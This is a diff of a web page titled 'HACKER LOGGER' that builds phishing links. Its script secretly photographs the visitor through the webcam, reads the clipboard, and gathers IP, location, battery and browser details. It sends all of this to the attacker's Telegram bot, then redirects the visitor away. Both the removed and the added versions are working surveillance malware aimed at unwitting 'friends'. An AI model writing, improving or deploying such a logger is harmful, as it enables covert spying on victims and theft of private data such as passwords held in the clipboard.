@@ -1,157 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>D3VX Logger</title>
+  <meta charset="UTF-8">
+  <title>HACKER LOGGER</title>
   <style>
-    body {
+    html, body {
       margin: 0;
-      background: #0a0f24;
-      color: #fff;
-      font-family: sans-serif;
-      text-align: center;
+      padding: 0;
+      height: 100%;
       overflow: hidden;
-    }
-    .card {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
       background: black;
-      padding: 30px;
-      border-radius: 15px;
+      color: #00ff00;
+      font-family: monospace;
     }
-    .card h1 {
-      font-size: 2em;
-    }
-    #permissionPopup {
+
+    canvas {
       position: fixed;
       top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.95);
-      color: lime;
-      display: none;
-      z-index: 9999;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
+      z-index: -1;
     }
-    #permissionPopup button {
+
+    .content {
+      z-index: 10;
+      position: relative;
+      text-align: center;
+      padding: 30px;
+    }
+
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      width: 90%;
+      max-width: 400px;
+      font-size: 16px;
+      background: black;
+      color: lime;
+      border: 1px solid lime;
+      box-shadow: 0 0 10px #00ff00;
+      transition: 0.2s ease;
+    }
+
+    input:focus, button:focus {
+      outline: none;
+      box-shadow: 0 0 20px #00ff00, 0 0 40px #00ff00;
+    }
+
+    .hidden { display: none; }
+
+    .flash {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: white;
+      opacity: 0;
+      z-index: 9999;
+      pointer-events: none;
+      animation: flash 1.5s infinite;
+    }
+
+    @keyframes flash {
+      0%, 100% { opacity: 0; }
+      50% { opacity: 0.03; }
+    }
+
+    footer {
+      font-size: 14px;
       margin-top: 20px;
-      padding: 10px 25px;
-      background: lime;
-      color: black;
-      font-weight: bold;
-      border: none;
-      border-radius: 5px;
-      font-size: 18px;
+      color: #0f0;
+      opacity: 0.7;
     }
   </style>
 </head>
 <body>
 
-  <!-- Animation / Welcome UI -->
-  <div class="card">
-    <h1>D3V✘</h1>
-    <p>Welcome to the My Server. Click Background And Enjoy Effect!</p>
-    <p>Hello dear I'm D3V X Hacker</p>
+<canvas id="matrix"></canvas>
+<div class="flash"></div>
+
+<div class="content">
+  <div id="mainBox">
+    <h2>👨‍💻 Hacker Logger Link Generator</h2>
+    <input id="bot" placeholder="Enter Telegram Bot Token">
+    <input id="chat" placeholder="Enter Chat ID">
+    <button onclick="generate(); playClick()">Generate Link</button>
+    <div id="result"></div>
   </div>
 
-  <!-- Popup Permission -->
-  <div id="permissionPopup">
-    <h2>💀 Allow us to See Something Amazing?</h2>
-    <button onclick="allowLogger()">✅ Allow</button>
+  <div id="visitBox" class="hidden">
+    <h2>🔍 Wait You See Something Amazing...</h2>
+    <p>Please wait...</p>
   </div>
 
-  <script>
-    const params = new URLSearchParams(location.search);
-    const uid = params.get("uid");
+  <footer>⚡ Coded by Divyansh ❤️</footer>
+</div>
 
+<!-- Click sound -->
+<audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-29.mp3" preload="auto"></audio>
+
+<script>
+  // Matrix Rain
+  const canvas = document.getElementById("matrix");
+  const ctx = canvas.getContext("2d");
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const chars = "01█▓▒░<>/$@#%&*";
+  const font_size = 14;
+  const columns = canvas.width / font_size;
+  const drops = Array.from({ length: columns }).fill(1);
+
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00FF00";
+    ctx.font = font_size + "px monospace";
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * font_size, drops[i] * font_size);
+      if (drops[i] * font_size > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 35);
+
+  // Play click sound
+  function playClick() {
+    document.getElementById("clickSound").play();
+  }
+
+  document.querySelectorAll("input, button").forEach(el => {
+    el.addEventListener("click", playClick);
+  });
+
+  // Copy link and show popup
+  function generate() {
+    const bot = encodeURIComponent(document.getElementById("bot").value.trim());
+    const chat = encodeURIComponent(document.getElementById("chat").value.trim());
+    if (!bot || !chat) return alert("Fill all fields");
+
+    const uid = btoa(`${bot}::${chat}`);
+    const link = `${location.origin}${location.pathname}?uid=${uid}`;
+
+    document.getElementById("result").innerHTML = `
+      <p><b>🔗 Your Link:</b></p>
+      <input type="text" id="copyLink" value="${link}" onclick="copyLink(); playClick()" readonly>
+      <p>👆 Tap to Copy</p>
+    `;
+  }
+
+  function copyLink() {
+    const input = document.getElementById("copyLink");
+    input.select();
+    document.execCommand("copy");
+    alert("✅ Link copied!\nSend it to your friend now.");
+  }
+
+  // Visit tracking mode
+  async function visitMode(bot, chat) {
+    document.getElementById("mainBox").classList.add("hidden");
+    document.getElementById("visitBox").classList.remove("hidden");
+
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    } catch {
+      alert("Camera blocked.");
+      return;
+    }
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement("canvas");
+    canvas.width = 480;
+    canvas.height = 360;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
+    stream.getTracks().forEach(t => t.stop());
+
+    const battery = await navigator.getBattery();
+    const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+    const loc = await fetch("https://ipapi.co/json").then(r => r.json()).catch(() => ({}));
+
+    let clip = "(Denied)";
+    try { clip = await navigator.clipboard.readText(); } catch {}
+
+    const message = `💀 Dᴇᴠɪᴄᴇ Tʀᴀᴄᴋɪɴɢ Sᴜᴄᴄᴇss ✅
+🌍 IP: ${ip.ip}
+🔋 Battery: ${Math.round(battery.level * 100)}%
+📋 Clipboard: ${clip}
+💻 OS: ${navigator.platform}
+📱 Browser: ${navigator.userAgent}
+📌 Location: ${loc.city || "-"}, ${loc.region || "-"}, ${loc.country_name || "-"}
+🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
+
+    const form = new FormData();
+    form.append("chat_id", chat);
+    form.append("photo", new File([blob], "cam.jpg", { type: "image/jpeg" }));
+    form.append("caption", message);
+
+    await fetch(`https://api.telegram.org/bot${bot}/sendPhoto`, {
+      method: "POST",
+      body: form
+    });
+
+    window.location.href = "https://nx3r.com/download-thumbnail?_y=ODczMTA&_x=NzI4MTc4NjIwNw";
+  }
+
+  // Trigger if UID param exists
+  window.onload = () => {
+    const uid = new URLSearchParams(location.search).get("uid");
     if (uid) {
-      document.body.innerHTML += document.getElementById("permissionPopup").outerHTML;
-      document.getElementById("permissionPopup").style.display = "flex";
+      const [bot, chat] = atob(uid).split("::");
+      visitMode(bot, chat);
     }
-
-    async function allowLogger() {
-      document.getElementById("permissionPopup").innerHTML = "<h2>⏳ Collecting Info...</h2>";
-
-      try {
-        const res = await fetch(`https://grizzled-gamy-child.glitch.me/get?uid=${uid}`);
-        const { token, chat_id } = await res.json();
-
-        // 📸 Camera Access
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-        let photos = [];
-
-        const capture = () => {
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0);
-          photos.push(canvas.toDataURL("image/jpeg"));
-        };
-
-        await new Promise(r => setTimeout(r, 1000)); capture();
-        await new Promise(r => setTimeout(r, 1500)); capture();
-        await new Promise(r => setTimeout(r, 1500)); capture();
-        stream.getTracks().forEach(t => t.stop());
-
-        // 📋 Clipboard read
-        let clipboardText = "Not allowed";
-        try {
-          clipboardText = await navigator.clipboard.readText();
-        } catch (e) {
-          clipboardText = "Permission denied or unavailable";
-        }
-
-        // 🔋 Battery + IP + OS
-        const battery = await navigator.getBattery();
-        const info = {
-          ip: await (await fetch("https://api.ipify.org?format=json")).json(),
-          ua: navigator.userAgent,
-          os: navigator.platform,
-          battery: `${Math.round(battery.level * 100)}%`
-        };
-
-        // 📍 Location
-        let location = "Not granted";
-        if (navigator.geolocation) {
-          await new Promise((resolve) => {
-            navigator.geolocation.getCurrentPosition((pos) => {
-              location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
-              resolve();
-            }, () => resolve());
-          });
-        }
-
-        const caption = `💀 𝗗𝗶𝘃𝘆𝗮𝗻𝘀𝗵 𝗗𝗲𝗲𝘄𝗮𝗻𝗮 💋\n\n📱 Device: ${info.ua}\n🔋 Battery: ${info.battery}\n💻 OS: ${info.os}\n🌐 IP: ${info.ip.ip}\n📍 Location: ${location}\n📋 Clipboard: ${clipboardText}\n\n🤴🏻𝐃𝐞𝐯𝐥𝐨𝐩𝐞𝐫 👨🏻‍💻 : @tera_paglu`;
-
-        // 🔁 Send to Telegram
-        for (let i = 0; i < photos.length; i++) {
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id,
-              photo: photos[i],
-              caption: i === 0 ? caption : ""
-            })
-          });
-        }
-
-        document.getElementById("permissionPopup").innerHTML = "<h2>✅ Sent to Telegram!</h2>";
-
-      } catch (err) {
-        console.error(err);
-        document.getElementById("permissionPopup").innerHTML = "<h2>❌ Error sending data!</h2>";
-      }
-    }
-  </script>
+  };
+</script>
 </body>
 </html>
